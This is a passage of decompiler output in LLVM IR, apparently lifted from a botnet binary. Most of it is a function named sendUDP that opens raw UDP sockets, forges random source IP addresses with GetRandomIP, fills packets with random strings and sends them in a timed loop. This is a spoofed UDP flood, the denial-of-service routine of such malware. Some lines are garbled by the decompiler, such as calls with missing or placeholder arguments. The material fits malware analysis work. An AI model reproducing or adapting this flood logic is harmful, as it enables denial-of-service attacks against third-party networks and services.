  uselistorder i32 %v4_804b6e4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804b6b3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b775, { 1, 0 }
  uselistorder label %dec_label_pc_804b754, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b63e, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i64 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_5()
  %tmp33 = call i16 @__decompiler_undefined_function_5()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %v0_804b792 = load i32, i32* @ebx, align 4
  %v13_804b793 = ptrtoint i32* %stack_var_-140 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804b79c = icmp eq i32 %arg2, 0
  %v1_804b7a0 = icmp eq i1 %v4_804b79c, false
  br i1 %v1_804b7a0, label %dec_label_pc_804b7b0, label %dec_label_pc_804b7a2

dec_label_pc_804b7a2:                             ; preds = %entry
  %v1_804b7a2 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804b7c5

dec_label_pc_804b7b0:                             ; preds = %entry
  %v1_804b7b3 = urem i32 %arg2, 65536
  store i32 %v1_804b7b3, i32* %eax.global-to-local, align 4
  store i32 %v1_804b7b3, i32* %stack_var_-140, align 4
  %v1_804b7b9 = trunc i32 %arg2 to i16
  %v2_804b7b9 = call i32 @htons(i16 %v1_804b7b9)
  br label %dec_label_pc_804b7c5

dec_label_pc_804b7c5:                             ; preds = %dec_label_pc_804b7a2, %dec_label_pc_804b7b0
  %v2_804b7c5 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-140, align 4
  %v3_804b7d5 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804b7d5, i32* %eax.global-to-local, align 4
  %v1_804b7da = icmp eq i32 %v3_804b7d5, 0
  %v1_804b7dc = icmp eq i1 %v1_804b7da, false
  br i1 %v1_804b7dc, label %dec_label_pc_804bc43, label %dec_label_pc_804b7e2

dec_label_pc_804b7e2:                             ; preds = %dec_label_pc_804b7c5
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804b7fb = icmp eq i32 %arg4, 32
  %v1_804b7ff = icmp eq i1 %v9_804b7fb, false
  br i1 %v1_804b7ff, label %dec_label_pc_804b925, label %dec_label_pc_804b805

dec_label_pc_804b805:                             ; preds = %dec_label_pc_804b7e2
  store i32 2, i32* %stack_var_-140, align 4
  %v3_804b81c = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v3_804b81c, i32* %eax.global-to-local, align 4
  %v4_804b824 = icmp eq i32 %v3_804b81c, 0
  br i1 %v4_804b824, label %dec_label_pc_804bc43, label %dec_label_pc_804b82e

dec_label_pc_804b82e:                             ; preds = %dec_label_pc_804b805
  %v1_804b831 = add i32 %arg5, 1
  store i32 %v1_804b831, i32* %eax.global-to-local, align 4
  store i32 %v1_804b831, i32* %stack_var_-140, align 4
  %v1_804b835 = call i32 @malloc(i32 %v1_804b831)
  store i32 %v1_804b835, i32* %eax.global-to-local, align 4
  %v4_804b83d = icmp eq i32 %v1_804b835, 0
  br i1 %v4_804b83d, label %dec_label_pc_804bc43, label %dec_label_pc_804b847

dec_label_pc_804b847:                             ; preds = %dec_label_pc_804b82e
  store i32 %v1_804b831, i32* %edx.global-to-local, align 4
  %v1_804b850 = inttoptr i32 %v1_804b835 to i8*
  store i32 %v1_804b835, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804b855 = and i32 %v1_804b835, -256
  store i32 %v1_804b855, i32* %eax.global-to-local, align 4
  %v5_804b857 = call i8* @_memset(i8* %v1_804b850, i32 %v1_804b855, i32 %v1_804b831)
  store i32 %v1_804b835, i32* %eax.global-to-local, align 4
  store i32 %v1_804b835, i32* %stack_var_-140, align 4
  %v3_804b866 = call i32 @makeRandomStr(i8* %v1_804b850, i32 %arg5)
  store i32 %v3_804b866, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b872 = call i32 @__GI_time(i32* null)
  %v5_804b877 = add i32 %v2_804b872, %arg3
  store i32 %v5_804b877, i32* %eax.global-to-local, align 4
  %sext = mul i64 %arg8, 4294967296
  %v2_804b903 = sdiv i64 %sext, 4294967296
  %v3_804b903 = mul nsw i64 %v2_804b903, 1000
  %v4_804b903 = trunc i64 %v3_804b903 to i32
  br label %dec_label_pc_804b88d.outer

dec_label_pc_804b88d.outer:                       ; preds = %dec_label_pc_804b900, %dec_label_pc_804b91d, %dec_label_pc_804b847
  %stack_var_-88.0.ph = phi i32 [ 0, %dec_label_pc_804b847 ], [ 0, %dec_label_pc_804b900 ], [ %v4_804b91d, %dec_label_pc_804b91d ]
  %stack_var_-92.0.ph = phi i32 [ 0, %dec_label_pc_804b847 ], [ %v4_804b8f5, %dec_label_pc_804b900 ], [ %v4_804b8f5, %dec_label_pc_804b91d ]
  br label %dec_label_pc_804b88d

dec_label_pc_804b88d:                             ; preds = %dec_label_pc_804b88d.outer, %dec_label_pc_804b8d7
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_804b8d7 ], [ %stack_var_-92.0.ph, %dec_label_pc_804b88d.outer ]
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v3_804b81c, i32* %eax.global-to-local, align 4
  store i32 %v3_804b81c, i32* %stack_var_-140, align 4
  %v6_804b8b8 = call i32 @__libc_sendto(i32 %v3_804b81c, i32 %v1_804b835, i32 %arg5, i32 0, i32 %v2_804b7c5, i32 16)
  store i32 %v6_804b8b8, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804b8c0 = icmp eq i32 %stack_var_-92.0, %arg6
  %v1_804b8c3 = icmp eq i1 %v15_804b8c0, false
  br i1 %v1_804b8c3, label %dec_label_pc_804b8f5, label %dec_label_pc_804b8c5

dec_label_pc_804b8c5:                             ; preds = %dec_label_pc_804b88d
  br i1 %v1_804b7a0, label %dec_label_pc_804b8d7, label %dec_label_pc_804b8cb

dec_label_pc_804b8cb:                             ; preds = %dec_label_pc_804b8c5
  %v0_804b8cb = load i32, i32* %stack_var_-140, align 4
  %v1_804b8cb = call i32 @rand_cmwc(i32 %v0_804b8cb)
  %v1_804b8d0 = urem i32 %v1_804b8cb, 65536
  store i32 %v1_804b8d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8d7

dec_label_pc_804b8d7:                             ; preds = %dec_label_pc_804b8c5, %dec_label_pc_804b8cb
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b8de = call i32 @__GI_time(i32* null)
  store i32 %v2_804b8de, i32* %eax.global-to-local, align 4
  %v8_804b8e6 = icmp sgt i32 %v2_804b8de, %v5_804b877
  br i1 %v8_804b8e6, label %dec_label_pc_804bc43, label %dec_label_pc_804b88d

dec_label_pc_804b8f5:                             ; preds = %dec_label_pc_804b88d
  %v4_804b8f5 = add i32 %stack_var_-92.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b8fb = icmp eq i32 %stack_var_-88.0.ph, %arg7
  %v1_804b8fe = icmp eq i1 %v15_804b8fb, false
  br i1 %v1_804b8fe, label %dec_label_pc_804b91d, label %dec_label_pc_804b900

dec_label_pc_804b900:                             ; preds = %dec_label_pc_804b8f5
  store i32 %v4_804b903, i32* %eax.global-to-local, align 4
  store i32 %v4_804b903, i32* %stack_var_-140, align 4
  %v2_804b90c = call i32 @usleep(i64 %v3_804b903)
  store i32 %v2_804b90c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b88d.outer

dec_label_pc_804b91d:                             ; preds = %dec_label_pc_804b8f5
  %v4_804b91d = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804b88d.outer

dec_label_pc_804b925:                             ; preds = %dec_label_pc_804b7e2
  store i32 %v13_804b793, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v3_804b941 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_804b941, i32* %eax.global-to-local, align 4
  %v4_804b949 = icmp eq i32 %v3_804b941, 0
  %v1_804b94d = icmp eq i1 %v4_804b949, false
  br i1 %v1_804b94d, label %dec_label_pc_804b954, label %dec_label_pc_804bc40

dec_label_pc_804b954:                             ; preds = %dec_label_pc_804b925
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804b963 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v3_804b941, i32* %eax.global-to-local, align 4
  store i32 %v3_804b941, i32* %stack_var_-140, align 4
  %v5_804b980 = call i32 @__GI_setsockopt(i32 %v3_804b941, i32 0, i32 3, i32 %v2_804b963, i32 4)
  store i32 %v5_804b980, i32* %eax.global-to-local, align 4
  %v2_804b985 = icmp slt i32 %v5_804b980, 0
  %v1_804b987 = icmp eq i1 %v2_804b985, false
  br i1 %v1_804b987, label %dec_label_pc_804b9c1.preheader, label %dec_label_pc_804bc40

dec_label_pc_804b9c1.preheader:                   ; preds = %dec_label_pc_804b954
  br label %dec_label_pc_804b997

dec_label_pc_804b997:                             ; preds = %dec_label_pc_804b9c1.preheader, %dec_label_pc_804b997
  %v4_804b9c177 = phi i32 [ 49, %dec_label_pc_804b9c1.preheader ], [ %v4_804b9c1, %dec_label_pc_804b997 ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804b99e = call i32 @__GI_time(i32* null)
  store i32 %v2_804b99e, i32* %eax.global-to-local, align 4
  store i32 %v2_804b99e, i32* @ebx, align 4
  %v0_804b9a5 = load i32, i32* %stack_var_-140, align 4
  %v1_804b9a5 = call i32 @rand_cmwc(i32 %v0_804b9a5)
  %v1_804b9aa = load i32, i32* @ebx, align 4
  %v2_804b9aa = xor i32 %v1_804b9aa, %v1_804b9a5
  store i32 %v2_804b9aa, i32* @eax, align 4
  store i32 %v2_804b9aa, i32* %stack_var_-140, align 4
  %v1_804b9af = call i32 @srand(i32 %v2_804b9aa)
  store i32 %v1_804b9af, i32* @eax, align 4
  %v0_804b9b4 = call i32 @random()
  store i32 %v0_804b9b4, i32* %eax.global-to-local, align 4
  store i32 %v0_804b9b4, i32* %stack_var_-140, align 4
  %v1_804b9bc = call i32 @init_rand(i32 %v0_804b9b4)
  store i32 %v1_804b9bc, i32* %eax.global-to-local, align 4
  %v4_804b9c1 = add nsw i32 %v4_804b9c177, -1
  %v13_804b9c4 = icmp eq i32 %v4_804b9c177, 0
  %v1_804b9c8 = icmp eq i1 %v13_804b9c4, false
  br i1 %v1_804b9c8, label %dec_label_pc_804b997, label %dec_label_pc_804b9ca

dec_label_pc_804b9ca:                             ; preds = %dec_label_pc_804b997
  %v4_804b9ca = icmp eq i32 %arg4, 0
  %v1_804b9ce = icmp eq i1 %v4_804b9ca, false
  br i1 %v1_804b9ce, label %dec_label_pc_804b9d9, label %dec_label_pc_804b9ef

dec_label_pc_804b9d9:                             ; preds = %dec_label_pc_804b9ca
  %v5_804b9e0 = sub i32 32, %arg4
  %v2_804b9e8 = urem i32 %v5_804b9e0, 32
  %v4_804b9e8 = icmp eq i32 %v2_804b9e8, 0
  br i1 %v4_804b9e8, label %bb73, label %bb

bb:                                               ; preds = %dec_label_pc_804b9d9
  %v5_804b9e8 = shl i32 1, %v2_804b9e8
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_804b9d9, %bb
  %v0_804b9ea = phi i32 [ %v5_804b9e8, %bb ], [ 1, %dec_label_pc_804b9d9 ]
  %v1_804b9ea = sub i32 0, %v0_804b9ea
  store i32 %v1_804b9ea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b9ef

dec_label_pc_804b9ef:                             ; preds = %dec_label_pc_804b9ca, %bb73
  %storemerge7 = phi i32 [ %v1_804b9ea, %bb73 ], [ 0, %dec_label_pc_804b9ca ]
  %v1_804b9f2 = add i32 %arg5, 28
  %v1_804b9fe = add i32 %arg5, 58
  %v2_804ba01 = and i32 %v1_804b9fe, -16
  %v0_804ba07 = load i32, i32* @esp, align 4
  %v2_804ba07 = sub i32 %v0_804ba07, %v2_804ba01
  %v1_804ba13 = add i32 %v2_804ba07, 39
  %v2_804ba16 = and i32 %v1_804ba13, -16
  store i32 %v2_804ba16, i32* %edx.global-to-local, align 4
  %v1_804ba2e = add i32 %v2_804ba16, 20
  %v5_804ba31 = inttoptr i32 %v1_804ba2e to i16*
  %v1_804ba37 = add i32 %arg5, 8
  store i32 %v1_804ba37, i32* @ebx, align 4
  store i32 %storemerge7, i32* %eax.global-to-local, align 4
  %v2_804ba3f = inttoptr i32 %v2_804ba07 to i32*
  store i32 %storemerge7, i32* %v2_804ba3f, align 4
  %v2_804ba42 = call i32 @GetRandomIP(i32 %v1_804b9f2, i32 %v2_804ba16)
  store i32 %v2_804ba42, i32* %eax.global-to-local, align 4
  %v1_804ba47 = load i32, i32* @esp, align 4
  %v2_804ba47 = inttoptr i32 %v1_804ba47 to i32*
  store i32 %v2_804ba42, i32* %v2_804ba47, align 4
  %v0_804ba4a = call i32 @htonl()
  %v3_804ba4f = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804ba4f, i32* %edx.global-to-local, align 4
  %v0_804ba52 = load i32, i32* @ebx, align 4
  %v1_804ba52 = load i32, i32* @esp, align 4
  %v2_804ba52 = add i32 %v1_804ba52, 16
  %v3_804ba52 = inttoptr i32 %v2_804ba52 to i32*
  store i32 %v0_804ba52, i32* %v3_804ba52, align 4
  %v0_804ba56 = load i32, i32* @esp, align 4
  %v1_804ba56 = add i32 %v0_804ba56, 12
  %v2_804ba56 = inttoptr i32 %v1_804ba56 to i32*
  store i32 17, i32* %v2_804ba56, align 4
  %v1_804ba5e = load i32, i32* @esp, align 4
  %v2_804ba5e = add i32 %v1_804ba5e, 8
  %v3_804ba5e = inttoptr i32 %v2_804ba5e to i32*
  store i32 %v0_804ba4a, i32* %v3_804ba5e, align 4
  %v0_804ba62 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba62 = load i32, i32* @esp, align 4
  %v2_804ba62 = add i32 %v1_804ba62, 4
  %v3_804ba62 = inttoptr i32 %v2_804ba62 to i32*
  store i32 %v0_804ba62, i32* %v3_804ba62, align 4
  store i32 %v2_804ba16, i32* %eax.global-to-local, align 4
  %v1_804ba69 = load i32, i32* @esp, align 4
  %v2_804ba69 = inttoptr i32 %v1_804ba69 to i32*
  store i32 %v2_804ba16, i32* %v2_804ba69, align 4
  %v0_804ba6c = call i32 @makeIPPacket()
  %v1_804ba7a = urem i32 %v1_804ba37, 65536
  store i32 %v1_804ba7a, i32* %eax.global-to-local, align 4
  %v1_804ba7d = load i32, i32* @esp, align 4
  %v2_804ba7d = inttoptr i32 %v1_804ba7d to i32*
  store i32 %v1_804ba7a, i32* %v2_804ba7d, align 4
  %v2_804ba80 = trunc i32 %v1_804ba2e to i16
  %v3_804ba80 = call i32 @htons(i16 %v2_804ba80)
  %v1_804ba85 = urem i32 %v3_804ba80, 65536
  store i32 %v1_804ba85, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba2e, i32* %eax.global-to-local, align 4
  %v1_804ba8b = trunc i32 %v3_804ba80 to i16
  %v3_804ba8b = add i32 %v2_804ba16, 24
  %v4_804ba8b = inttoptr i32 %v3_804ba8b to i16*
  store i16 %v1_804ba8b, i16* %v4_804ba8b, align 8
  %v2_804ba8f = call i32 @rand_cmwc(i32 %v1_804ba2e)
  %v1_804ba94 = urem i32 %v2_804ba8f, 65536
  store i32 %v1_804ba94, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba2e, i32* %eax.global-to-local, align 4
  %v1_804ba9a = trunc i32 %v2_804ba8f to i16
  store i16 %v1_804ba9a, i16* %v5_804ba31, align 4
  br i1 %v1_804b7a0, label %dec_label_pc_804bab0, label %dec_label_pc_804baa3

dec_label_pc_804baa3:                             ; preds = %dec_label_pc_804b9ef
  %v2_804baa3 = call i32 @rand_cmwc(i32 %v1_804ba2e)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804bac4

dec_label_pc_804bab0:                             ; preds = %dec_label_pc_804b9ef
  %v1_804bab3 = urem i32 %arg2, 65536
  store i32 %v1_804bab3, i32* %eax.global-to-local, align 4
  %v1_804bab6 = load i32, i32* @esp, align 4
  %v2_804bab6 = inttoptr i32 %v1_804bab6 to i32*
  store i32 %v1_804bab3, i32* %v2_804bab6, align 4
  %v3_804bab9 = call i32 @htons(i16 %tmp33)
  br label %dec_label_pc_804bac4

dec_label_pc_804bac4:                             ; preds = %dec_label_pc_804baa3, %dec_label_pc_804bab0
  %v1_804bb84.pre-phi = phi i32 [ %.pre, %dec_label_pc_804baa3 ], [ %v1_804bab3, %dec_label_pc_804bab0 ]
  %storemerge9.in = phi i32 [ %v2_804baa3, %dec_label_pc_804baa3 ], [ %v3_804bab9, %dec_label_pc_804bab0 ]
  %storemerge6 = trunc i32 %storemerge9.in to i16
  %sext10 = mul i32 %storemerge9.in, 65536
  %v4_804bac7 = sdiv i32 %sext10, 65536
  %v3_804baca = add i32 %v2_804ba16, 22
  %v4_804baca = inttoptr i32 %v3_804baca to i16*
  store i16 %storemerge6, i16* %v4_804baca, align 2
  %v1_804bad1 = add i32 %v2_804ba16, 26
  %v2_804bad1 = inttoptr i32 %v1_804bad1 to i16*
  store i16 0, i16* %v2_804bad1, align 2
  %v1_804bada = add i32 %v2_804ba16, 28
  store i32 %v1_804bada, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804bae0 = load i32, i32* @esp, align 4
  %v2_804bae0 = add i32 %v1_804bae0, 4
  %v3_804bae0 = inttoptr i32 %v2_804bae0 to i32*
  store i32 %arg5, i32* %v3_804bae0, align 4
  %v0_804bae4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bae4 = load i32, i32* @esp, align 4
  %v2_804bae4 = inttoptr i32 %v1_804bae4 to i32*
  store i32 %v0_804bae4, i32* %v2_804bae4, align 4
  %v3_804bae7 = sext i16 %tmp to i32
  %v4_804bae7 = inttoptr i32 %v4_804bac7 to i8*
  %v5_804bae7 = call i32 @makeRandomStr(i8* %v4_804bae7, i32 %v3_804bae7)
  store i32 %v2_804ba16, i32* %eax.global-to-local, align 4
  %v1_804baef = or i32 %v2_804ba16, 2
  %v2_804baef = inttoptr i32 %v1_804baef to i16*
  %v3_804baef = load i16, i16* %v2_804baef, align 2
  %v4_804baef = zext i16 %v3_804baef to i32
  store i32 %v4_804baef, i32* %edx.global-to-local, align 4
  store i32 %v2_804ba16, i32* %eax.global-to-local, align 4
  %v1_804baf8 = load i32, i32* @esp, align 4
  %v2_804baf8 = add i32 %v1_804baf8, 4
  %v3_804baf8 = inttoptr i32 %v2_804baf8 to i32*
  store i32 %v4_804baef, i32* %v3_804baf8, align 4
  %v0_804bafc = load i32, i32* %eax.global-to-local, align 4
  %v1_804bafc = load i32, i32* @esp, align 4
  %v2_804bafc = inttoptr i32 %v1_804bafc to i32*
  store i32 %v0_804bafc, i32* %v2_804bafc, align 4
  %v4_804baff = inttoptr i32 %v4_804bac7 to i16*
  %v5_804baff = call i32 @csum(i16* %v4_804baff, i32 %v3_804bae7)
  %v1_804bb04 = urem i32 %v5_804baff, 65536
  store i32 %v1_804bb04, i32* %edx.global-to-local, align 4
  store i32 %v2_804ba16, i32* %eax.global-to-local, align 4
  %v1_804bb0a = trunc i32 %v5_804baff to i16
  %v3_804bb0a = or i32 %v2_804ba16, 10
  %v4_804bb0a = inttoptr i32 %v3_804bb0a to i16*
  store i16 %v1_804bb0a, i16* %v4_804bb0a, align 2
  %v0_804bb0e = load i32, i32* @esp, align 4
  %v1_804bb0e = inttoptr i32 %v0_804bb0e to i32*
  store i32 0, i32* %v1_804bb0e, align 4
  %v2_804bb15 = inttoptr i32 %v4_804bac7 to i32*
  %v3_804bb15 = call i32 @__GI_time(i32* %v2_804bb15)
  %v5_804bb1a = add i32 %v3_804bb15, %arg3
  store i32 %v5_804bb1a, i32* %eax.global-to-local, align 4
  %v3_804bbaa = or i32 %v2_804ba16, 4
  %v4_804bbaa = inttoptr i32 %v3_804bbaa to i16*
  %v2_804bbc6 = or i32 %v2_804ba16, 12
  %v3_804bbc6 = inttoptr i32 %v2_804bbc6 to i32*
  %sext13 = mul i64 %arg8, 4294967296
  %v2_804bc1e = sdiv i64 %sext13, 4294967296
  %v3_804bc1e = mul nsw i64 %v2_804bc1e, 1000
  %v4_804bc1e = trunc i64 %v3_804bc1e to i32
  br label %dec_label_pc_804bb30.outer

dec_label_pc_804bb30.outer:                       ; preds = %dec_label_pc_804bc1b, %dec_label_pc_804bc38, %dec_label_pc_804bac4
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804bac4 ], [ %v4_804bc10, %dec_label_pc_804bc38 ], [ %v4_804bc10, %dec_label_pc_804bc1b ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804bac4 ], [ %v4_804bc38, %dec_label_pc_804bc38 ], [ 0, %dec_label_pc_804bc1b ]
  %stack_var_-104.0.ph = phi i16 [ %tmp, %dec_label_pc_804bac4 ], [ %storemerge, %dec_label_pc_804bc38 ], [ %storemerge, %dec_label_pc_804bc1b ]
  br label %dec_label_pc_804bb30

dec_label_pc_804bb30:                             ; preds = %dec_label_pc_804bb30.outer, %dec_label_pc_804bbf3
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804bbf3 ], [ %stack_var_-84.0.ph, %dec_label_pc_804bb30.outer ]
  %stack_var_-104.0 = phi i16 [ %storemerge, %dec_label_pc_804bbf3 ], [ %stack_var_-104.0.ph, %dec_label_pc_804bb30.outer ]
  store i32 %v2_804ba16, i32* %edx.global-to-local, align 4
  %v0_804bb36 = load i32, i32* @esp, align 4
  %v1_804bb36 = add i32 %v0_804bb36, 20
  %v2_804bb36 = inttoptr i32 %v1_804bb36 to i32*
  store i32 16, i32* %v2_804bb36, align 4
  %v1_804bb3e = load i32, i32* @esp, align 4
  %v2_804bb3e = add i32 %v1_804bb3e, 16
  %v3_804bb3e = inttoptr i32 %v2_804bb3e to i32*
  store i32 %v2_804b7c5, i32* %v3_804bb3e, align 4
  %v0_804bb42 = load i32, i32* @esp, align 4
  %v1_804bb42 = add i32 %v0_804bb42, 12
  %v2_804bb42 = inttoptr i32 %v1_804bb42 to i32*
  store i32 0, i32* %v2_804bb42, align 4
  %v1_804bb4d = load i32, i32* @esp, align 4
  %v2_804bb4d = add i32 %v1_804bb4d, 8
  %v3_804bb4d = inttoptr i32 %v2_804bb4d to i32*
  store i32 %v1_804b9f2, i32* %v3_804bb4d, align 4
  %v0_804bb51 = load i32, i32* %edx.global-to-local, align 4
  %v1_804bb51 = load i32, i32* @esp, align 4
  %v2_804bb51 = add i32 %v1_804bb51, 4
  %v3_804bb51 = inttoptr i32 %v2_804bb51 to i32*
  store i32 %v0_804bb51, i32* %v3_804bb51, align 4
  store i32 %v3_804b941, i32* %eax.global-to-local, align 4
  %v1_804bb58 = load i32, i32* @esp, align 4
  %v2_804bb58 = inttoptr i32 %v1_804bb58 to i32*
  store i32 %v3_804b941, i32* %v2_804bb58, align 4
  %v6_804bb5b = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804bb5b, i32* %eax.global-to-local, align 4
  %v1_804bb60 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %v1_804bb65 = urem i32 %v1_804bb60, 65536
  store i32 %v1_804bb65, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba2e, i32* %eax.global-to-local, align 4
  %v1_804bb6b = trunc i32 %v1_804bb60 to i16
  store i16 %v1_804bb6b, i16* %v5_804ba31, align 4
  br i1 %v1_804b7a0, label %dec_label_pc_804bb81, label %dec_label_pc_804bb74

dec_label_pc_804bb74:                             ; preds = %dec_label_pc_804bb30
  %v1_804bb74 = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804bb95

dec_label_pc_804bb81:                             ; preds = %dec_label_pc_804bb30
  store i32 %v1_804bb84.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804bb87 = load i32, i32* @esp, align 4
  %v2_804bb87 = inttoptr i32 %v1_804bb87 to i32*
  store i32 %v1_804bb84.pre-phi, i32* %v2_804bb87, align 4
  %v3_804bb8a = call i32 @htons(i16 %stack_var_-104.0)
  br label %dec_label_pc_804bb95

dec_label_pc_804bb95:                             ; preds = %dec_label_pc_804bb74, %dec_label_pc_804bb81
  %storemerge11.in = phi i32 [ %v1_804bb74, %dec_label_pc_804bb74 ], [ %v3_804bb8a, %dec_label_pc_804bb81 ]
  %storemerge = trunc i32 %storemerge11.in to i16
  store i32 %v1_804ba2e, i32* %eax.global-to-local, align 4
  %sext12 = mul i32 %storemerge11.in, 65536
  %v4_804bb98 = sdiv i32 %sext12, 65536
  store i32 %v4_804bb98, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804baca, align 2
  %v2_804bb9f = call i32 @rand_cmwc(i32 %v4_804bb98)
  %v1_804bba4 = urem i32 %v2_804bb9f, 65536
  store i32 %v1_804bba4, i32* %edx.global-to-local, align 4
  %v1_804bbaa = trunc i32 %v2_804bb9f to i16
  store i16 %v1_804bbaa, i16* %v4_804bbaa, align 4
  store i32 %storemerge7, i32* %eax.global-to-local, align 4
  %v1_804bbb1 = load i32, i32* @esp, align 4
  %v2_804bbb1 = inttoptr i32 %v1_804bbb1 to i32*
  store i32 %storemerge7, i32* %v2_804bbb1, align 4
  %v3_804bbb4 = call i32 @GetRandomIP(i32 %v4_804bb98, i32 %v13_804b793)
  store i32 %v3_804bbb4, i32* %eax.global-to-local, align 4
  %v1_804bbb9 = load i32, i32* @esp, align 4
  %v2_804bbb9 = inttoptr i32 %v1_804bbb9 to i32*
  store i32 %v3_804bbb4, i32* %v2_804bbb9, align 4
  %v0_804bbbc = call i32 @htonl()
  store i32 %v0_804bbbc, i32* %edx.global-to-local, align 4
  store i32 %v0_804bbbc, i32* %v3_804bbc6, align 4
  store i32 %v2_804ba16, i32* %eax.global-to-local, align 4
  %v3_804bbcc = load i16, i16* %v2_804baef, align 2
  %v4_804bbcc = zext i16 %v3_804bbcc to i32
  store i32 %v4_804bbcc, i32* %edx.global-to-local, align 4
  store i32 %v2_804ba16, i32* %eax.global-to-local, align 4
  %v1_804bbd5 = load i32, i32* @esp, align 4
  %v2_804bbd5 = add i32 %v1_804bbd5, 4
  %v3_804bbd5 = inttoptr i32 %v2_804bbd5 to i32*
  store i32 %v4_804bbcc, i32* %v3_804bbd5, align 4
  %v0_804bbd9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bbd9 = load i32, i32* @esp, align 4
  %v2_804bbd9 = inttoptr i32 %v1_804bbd9 to i32*
  store i32 %v0_804bbd9, i32* %v2_804bbd9, align 4
  %v3_804bbdc = inttoptr i32 %v4_804bb98 to i16*
  %v4_804bbdc = call i32 @csum(i16* %v3_804bbdc, i32 %v13_804b793)
  %v1_804bbe1 = urem i32 %v4_804bbdc, 65536
  store i32 %v1_804bbe1, i32* %edx.global-to-local, align 4
  %v1_804bbe7 = trunc i32 %v4_804bbdc to i16
  store i16 %v1_804bbe7, i16* %v4_804bb0a, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804bbee = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804bbf1 = icmp eq i1 %v15_804bbee, false
  br i1 %v1_804bbf1, label %dec_label_pc_804bc10, label %dec_label_pc_804bbf3

dec_label_pc_804bbf3:                             ; preds = %dec_label_pc_804bb95
  %v0_804bbf3 = load i32, i32* @esp, align 4
  %v1_804bbf3 = inttoptr i32 %v0_804bbf3 to i32*
  store i32 0, i32* %v1_804bbf3, align 4
  %v2_804bbfa = inttoptr i32 %v4_804bb98 to i32*
  %v3_804bbfa = call i32 @__GI_time(i32* %v2_804bbfa)
  store i32 %v3_804bbfa, i32* %eax.global-to-local, align 4
  %v8_804bc02 = icmp sgt i32 %v3_804bbfa, %v5_804bb1a
  br i1 %v8_804bc02, label %dec_label_pc_804bc40, label %dec_label_pc_804bb30

dec_label_pc_804bc10:                             ; preds = %dec_label_pc_804bb95
  %v4_804bc10 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804bc16 = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804bc19 = icmp eq i1 %v15_804bc16, false
  br i1 %v1_804bc19, label %dec_label_pc_804bc38, label %dec_label_pc_804bc1b

dec_label_pc_804bc1b:                             ; preds = %dec_label_pc_804bc10
  store i32 %v4_804bc1e, i32* %eax.global-to-local, align 4
  %v1_804bc24 = load i32, i32* @esp, align 4
  %v2_804bc24 = inttoptr i32 %v1_804bc24 to i32*
  store i32 %v4_804bc1e, i32* %v2_804bc24, align 4
  %v1_804bc27 = sext i32 %v4_804bc10 to i64
  %v2_804bc27 = call i32 @usleep(i64 %v1_804bc27)
  store i32 %v2_804bc27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb30.outer

dec_label_pc_804bc38:                             ; preds = %dec_label_pc_804bc10
  %v4_804bc38 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804bb30.outer

